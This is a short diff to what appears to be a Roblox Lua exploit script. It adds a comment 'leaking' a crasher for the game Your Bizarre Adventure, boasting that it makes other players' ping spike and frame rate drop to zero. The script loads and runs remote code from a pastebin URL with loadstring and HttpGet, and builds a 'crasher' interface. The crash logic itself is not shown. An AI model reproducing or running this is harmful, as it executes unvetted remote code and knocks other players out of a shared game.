@@ -1,3 +1,5 @@
+--[[ I have decided to leak my YBA player crasher which i discovered ages ago! enjoy crashing players! (their ping spikes to millions and fps drops to 0) ]]--
+
 local Library = loadstring(game:HttpGet("https://pastebin.com/raw/ry59CnUE"))()
 local Window = Library.Create("vez private crasher ui", "your bizarre adventure")
 local PlayerTab = Window:Tab("Player")
